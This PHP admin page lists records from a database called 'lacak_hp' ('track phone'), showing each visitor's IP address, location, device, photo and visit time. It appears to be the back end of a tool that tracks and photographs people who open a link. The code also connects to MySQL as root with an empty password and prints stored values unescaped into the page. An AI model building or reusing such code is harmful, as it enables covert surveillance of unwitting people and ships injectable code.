<?php

session_start();

if(!isset($_SESSION['admin'])) {
    header("Location: login.php");
    exit();
}

// ===============================
// DATABASE
// ===============================
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);

$result = $conn->query("SELECT * FROM pengunjung ORDER BY id DESC");

?>

<!DOCTYPE html>
<html>

<head>
    <title>Admin Panel</title>

    <style>

        body {
            margin: 0;
            background: #0a0a0a;
            color: white;
            font-family: Arial;
        }

        header {
            background: black;
            padding: 15px;
            display: flex;
            justify-content: space-between;
        }

        .logout {
            background: red;
            padding: 8px 15px;
            color: white;
            text-decoration: none;
        }

        .container {
            padding: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #111;
        }

        th, td {
            border: 1px solid #333;
            padding: 10px;
            text-align: center;
        }

        th {
            background: #222;
        }

        img {
            width: 80px;
            border-radius: 5px;
        }

    </style>

</head>

<body>

<header>

    <div>ADMIN PANEL</div>

    <a class="logout" href="logout.php">Logout</a>

</header>

<div class="container">

    <h2>Data Pengunjung</h2>

    <table>

        <tr>
            <th>ID</th>
            <th>IP</th>
            <th>Lokasi</th>
            <th>Perangkat</th>
            <th>Foto</th>
            <th>Waktu</th>
        </tr>

        <?php while($row = $result->fetch_assoc()) { ?>

        <tr>

            <td><?php echo $row['id']; ?></td>

            <td><?php echo $row['ip_address']; ?></td>

            <td><?php echo $row['lokasi']; ?></td>

            <td style="font-size:12px">
                <?php echo $row['perangkat']; ?>
            </td>

            <td>
                <img src="foto/<?php echo $row['foto']; ?>">
            </td>

            <td><?php echo $row['waktu']; ?></td>

        </tr>

        <?php } ?>

    </table>

</div>

</body>

</html>
